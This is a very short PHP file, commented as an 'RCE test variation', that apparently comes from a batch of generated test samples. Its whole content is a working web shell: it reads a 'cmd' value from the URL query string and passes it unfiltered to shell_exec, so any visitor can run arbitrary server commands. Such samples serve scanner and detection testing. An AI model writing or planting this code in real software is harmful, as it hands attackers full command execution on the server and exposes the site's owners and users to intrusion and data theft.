<?php
// RCE test variation #738
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>